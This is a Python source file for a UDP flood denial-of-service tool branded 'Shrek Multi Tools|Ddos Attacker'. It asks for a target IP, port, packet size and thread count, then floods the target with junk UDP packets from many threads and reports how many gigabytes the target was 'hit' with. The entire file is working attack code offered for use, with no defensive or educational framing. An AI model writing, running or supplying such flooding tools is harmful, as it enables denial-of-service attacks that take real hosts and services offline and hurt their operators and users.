from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep
import colorama
from colorama import Fore
import platform
import ctypes
import subprocess
import os

def clear_screen():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')


class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 35

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb.", end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

def main():
    clear_screen()

    if platform.system() == 'Windows':
        ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools|Ddos Attacker")

    print(f'''
    {Fore.GREEN}
 ▓█████▄  ▓█████▄  ▒█████    ██████      ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄      ▄████▄  ▀██ ▄█▀▓█████ ██▀███  
 ▒██▀ ██▌ ▒██▀ ██▌▒██▒  ██▒▒██    ▒     ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄   ▒██▀ ▀█   ██▄█▒ ▓█   ▀▓██ ▒ ██▒
 ░██   █▌ ░██   █▌▒██░  ██▒░ ▓██▄       ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄ ▒▓█    ▄ ▓███▄░ ▒███  ▓██ ░▄█ ▒
░░▓█▄   ▌▒░▓█▄   ▌▒██   ██░  ▒   ██▒    ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██▒▓▓▄ ▄██ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
░░▒████▓ ░░▒████▓ ░ ████▓▒░▒██████▒▒     ▓█   ▓██  ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒ ▓███▀  ▒██▒ █▄░▒████░██▓ ▒██▒
 ░ ▒▒▓  ▒ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░     ▒▒   ▓▒█  ▒ ░░     ▒ ░░    ▒▒   ▓▒█░ ░▒ ▒   ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
   ░ ▒  ▒   ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░        ░   ▒▒     ░        ░      ░   ▒▒   ░  ▒   ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
   ░ ░  ░   ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░        ░   ▒    ░ ░      ░ ░      ░   ▒  ░        ░ ░░ ░  ░     ░   ░ 
     ░        ░        ░ ░        ░            ░                          ░  ░ ░      ░  ░      ░     ░   
    ''')

    try:
        ip = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Enter the IP to hit: ''')
    except KeyboardInterrupt:
        print("\nExiting the program.")
        return

    port = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Enter port (Enter for Default): ''')
    force = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Bytes per packet (Or Enter For Default): ''')
    threads = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Threads (Enter For Default): ''')

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            print("Invalid input. Bytes per packet should be an integer.")
            return

    if threads == '':
        threads = 35
    else:
        try:
            threads = int(threads)
        except ValueError:
            print("Invalid input. Threads should be an integer.")
            return

    print(Fore.GREEN +f'''
> {Fore.WHITE}Starting attack on {Fore.GREEN}[{Fore.WHITE}{ip}{Fore.GREEN}].''')
    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        print("A fatal error has occurred, and the attack was stopped.")
        return

    try:
        while True:
            user_input = input(f'''{Fore.GREEN}[{Fore.WHITE}00{Fore.GREEN}] {Fore.WHITE}Exit


{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} ''')
            if user_input == '00' or user_input == '0':
                brute.stop()
                print(f"Attack stopped. {ip} was Hit with {round(brute.total, 1)} Gb.\n")
                break
    except KeyboardInterrupt:
        brute.stop()
        print(f"Attack stopped. {ip} was Hit with {round(brute.total, 1)} Gb.\n")

if __name__ == '__main__':
    main()
